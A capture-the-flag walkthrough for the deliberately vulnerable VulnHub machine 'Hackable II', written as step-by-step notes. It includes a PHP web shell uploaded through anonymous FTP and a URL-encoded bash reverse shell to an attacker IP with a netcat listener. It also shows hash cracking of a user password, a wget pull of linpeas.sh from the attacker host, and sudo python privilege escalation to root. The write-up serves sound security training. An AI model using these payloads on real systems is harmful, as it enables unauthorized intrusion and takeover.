
>[!hint] You can find the [here](https://www.vulnhub.com/entry/hackable-ii,711/).

# Scanning :

**We use Nmap for that**

```bash
nmap -A -sV 10.38.1.111
```

**Output :**

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 (RSA)
|   256 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 (ECDSA)
|_  256 f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

>[!question] note
>- So we see port 21 opened, which is for ftp. We also notice that **Anonymous FTP** is allowed, which means that we can connect via FTP without a user name or password.
>- We also see that port 22 is opened, which is for ssh connection. For now it is useless as we don't have any credentials.
>- Then we see port 80 open, which is for a web server. This is very interesting, as we usually start by searching there.

# FTP analyzing

**using ftp command**

```sh
ftp anonymous@10.38.1.111
```

>[!bug] We find a file which is called CALL.html, but it doesn't seem to contain important informations.

# Web server scanning

>[!hint] We first check if there is any robots.txt file

> There isn't

**We will use dirb to scan for directories or files that might be interesting**

```sh
dirb http://10.38.1.111/ /usr/share/wordlists/dirb/common.txt # note : I use kali linux, who has already some default dictionaries
```

**Output :**

```sh
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jul 31 14:23:08 2023
URL_BASE: http://10.38.1.111
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.38.1.111/ ----
==> DIRECTORY: http://10.38.1.111/files/                                                                           
+ http://10.38.1.111/index.html (CODE:200|SIZE:11239)                                                              
+ http://10.38.1.111/server-status (CODE:403|SIZE:276)                                                             
                                                                                                                   
---- Entering directory: http://10.38.1.111/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Jul 31 14:23:09 2023
DOWNLOADED: 4612 - FOUND: 2
```

>[!success] We found a directory who is listable and called "files", it might be interesting

# /files/ directory 

>[!question] note
>- /files/ is actually the ftp directory because we find the CALL.html file in it.
>- It means that we can actually inject files in this directory and maybe obtain a reverse shell.

# PHP command injection :

>[!hint] We create a php file which this code in it :
>
>```php
><?php system($_GET["cmd"]) ?>

>[!info] Explanations : 
>- The PHP `system()` function execute an external command and display the output.
>- With `$_GET["cmd"]`, we can inject some commands in a variable named `cmd`, and it will be executed by the `system()` command.

# Bash Reverse Shell :

>[!danger] Beforehand :
>We have to launch a listener on our attacking device, we'll use netcat : 
>```sh
>nc -l -p 1234

>[!hint] We just have to inject the following command in the `cmd` variable 
>```sh
>cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261"

>[!info] Explanations :
>- `-c`  tell to bash to read its instructions from a string, which is convenient when working on one line.
>- `sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261` is just `sh -i >& /dev/tcp/10.38.1.110/1234 0>&1` [URL encoded](https://www.w3schools.com/tags/ref_urlencode.ASP) (it would not work otherwise)
>- Overall, it tries to connect back to our **Attacker's device**.

>[!success] Connection made

# Connected as www-data

>[!hint] We now want to gain access to a user account.
>We first list the /home directory, and we find a user named **shrek**

>[!question] We also find a file named important.txt
>It tells us to go run a hidden bash script in the / directory names .runme.sh
>

**Output** :

```txt
⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d
```

>[!hint] We now have what seems to be the hashed password of the shrek user.

>[!info] Common knowledge :
>- Default password hashing in Linux systems is in MD5.
>- We can use [tunnels up](https://www.tunnelsup.com/hash-analyzer/) to be sure of it.


# Hash cracking 

>[!hint] Solutions
>- We can use John, but for simplicity, we will use [crackstation](https://crackstation.net/) 
>- We find that the hash is in fact `onion`

# SSH connection

>[!success] Connection
>We now have the user : `shrek`, and the password: `onion`

>[!hint] USER FLAG
>We connect and find the following flag :

```txt
>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXK0OkkkkO0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXOo:'.            .';lkXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXKo'                        .ckXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXx,                 ........      :OXXXXXXXXXXXXXXXXXXXXX 
XXXXXXXXXXXXXXXXXXk.                  .............    'kXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXK;                    ...............    '0XXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXX0.          .:lol;.    .....;oxkxo:.....    oXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXX0         .oNMMMMMMMO.  ...lXMMMMMMMWO;...    cXXXXXXXXXXXXXXX
XXXXXXXXXXXXXK.        lWMMMMMMMMMMW; ..xMMMMMMMMMMMMx....   lXXXXXXXXXXXXXX
XXXXXXXXXXXXX;        kMMMMMMMMMMMMMM..:MMMMMMMMMMMMMM0...    OXXXXXXXXXXXXX
XXXXXXXXXXXXO        oMMMMMXKXMMMMMMM:.kMMMMMMNKNMMMMMMo...   'XXXXXXXXXXXXX
XXXXXXXXXXXX,        WMMWl. :OK0MMMMMl.OMMMMo. ,OXXWMMMX...    XXXXXXXXXXXXX
XXXXXXXXXXXX        'MMM:   0MMocMMMM,.oMMMl   xMMO;MMMM...    kXXXXXXXXXXXX
XXXXXXXXXXX0        .MMM,    .. ;MMM0 ..NMM:    .. 'MMMW...    kXXXXXXXXXXXX
XXXXXXXXXXXO         XMMX'     ,NMMX  ..;WMN,     .XMMMO...    xXXXXXXXXXXXX
XXXXXXXXXXX0         .NMMMXkxkXMMMk   ...,0MMXkxkXMMMMN,...    dXXXXXXXXXXXX
XXXXXXXXXXXX          .xWMMMMMMWk.    .....c0MMMMMMMMk'....    dXXXXXXXXXXXX
XXXXXXXXXXXXl            ,colc'   .;::o:dc,..'codxdc''.....    dXXXXXXXXXXXX
XXXXXXXXXXXXX         .OOkxxdxxkOOOx ,d.:OOOOkxxxxkkOOd....    xXXXXXXXXXXXX
XXXXXXXXXXXXXd         oOOOOOOOOOOOOxOOOOOOOOOOOOOOOOO,....    OXXXXXXXXXXXX
XXXXXXXXXXXXXX.         cOOOOOOOOOOOOOOOOOOOOOOOOOOOx,.....    KXXXXXXXXXXXX
XXXXXXXXXXXXXXO          .xOOOOOOOOOOOOOOOOOOOOOOOkc.......    NXXXXXXXXXXXX
XXXXXXXXXXXXXXX;           ;kOOOOOOOOOOOOOOOOOOOkc.........   ,XXXXXXXXXXXXX
XXXXXXXXXXXXXXX0             ;kOOOOOOOOOOOOOOOd;...........   dXXXXXXXXXXXXX
XXXXXXXXXXXXXXXX.              ,dOOOOOOOOOOdc'.............   xXXXXXXXXXXXXX
XXXXXXXXXXXXXXXX.                 .''''..   ...............   .kXXXXXXXXXXXX
XXXXXXXXXXXXXXXK           .;okKNWWWWNKOd:.    ..............   'kXXXXXXXXXX
XXXXXXXXXXXXXXX'        .dXMMMMMMMMMMMMMMMMWO:    .............   'kXXXXXXXX
XXXXXXXXXXXXXK'       ,0MMMMMMMMMMMMMMMMMMMMMMWx.   ............    ,KXXXXXX
XXXXXXXXXXXKc       .0MMMMMMMMMMMMMMMMMMMMMMMMMMMk.   ............    xXXXXX
XXXXXXXXXXl        cWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo   .............   :XXXX
XXXXXXXXK.        dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0    ............   .KXX
XXXXXXXX.        'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO   .............   'XXX
invite-me: ["linkedin link, you will have to do the ctf to have it"]
```

# Privilege escalation's vectors :

>[!important] Scanning for a vector of attack
>- We import from our attacking machine the `linpeas.sh` script, which is very efficient (`python -m http.server 8000` on the attacker device and `wget http://10.38.1.110:8000/linpeas.sh` from the ssh connection to the target device)

> We then wait for the script to terminate.

# Root access 

>[!hint] We find, in the linpeas' script's output, that our user have all privileges with python3.5 :
>```sh
>shrek ALL = NOPASSWD:/usr/bin/python3.5
>```
>We then just spawn a bash shell with **sudo** command using python3.5 :
>```sh
>sudo /usr/bin/python3.5 -c 'import pty;pty.spawn("/bin/bash")'

>[!success] Root access

